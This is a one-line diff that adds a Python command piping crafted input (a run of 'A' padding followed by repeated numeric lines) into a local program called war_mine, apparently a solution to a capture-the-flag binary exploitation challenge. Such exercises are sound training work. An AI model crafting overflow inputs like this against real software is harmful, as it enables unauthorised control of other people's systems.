@@ -1,0 +1,1 @@
+python -c 'print "A"*32+"\n" + "1\n"*84+"30\n"*17' | ./war_mine
